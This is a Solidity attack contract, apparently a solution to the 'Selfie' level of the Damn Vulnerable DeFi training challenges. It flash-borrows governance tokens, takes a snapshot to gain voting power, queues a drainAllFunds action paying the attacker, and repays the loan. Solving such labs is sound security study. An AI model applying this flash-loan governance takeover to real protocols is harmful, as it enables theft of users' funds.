pragma solidity ^0.6.0;

import "./../selfie/SelfiePool.sol";
import "./../selfie/SimpleGovernance.sol";
import "./../DamnValuableTokenSnapshot.sol";

contract SelfieAttacker {

    address owner;
    address selAddr;
    address govAddr;
    address tokenAddr;

    SelfiePool sP;
    SimpleGovernance sG;
    DamnValuableTokenSnapshot token;
    constructor(address _selfiePool, address _gov, address _token) public {
        owner = msg.sender;
        selAddr = _selfiePool;
        govAddr = _gov;
        tokenAddr = _token;
        sP = SelfiePool(selAddr);
        sG = SimpleGovernance(govAddr); 
    }

    function attack() public {
        sP.flashLoan(1500000 ether);
    }

    function receiveTokens(address _token, uint256 _amount) public {
        token = DamnValuableTokenSnapshot(_token);
        token.snapshot();
        sG.queueAction(selAddr, abi.encodeWithSignature("drainAllFunds(address)", owner), 0);
        token.transfer(selAddr, _amount);
    }    
}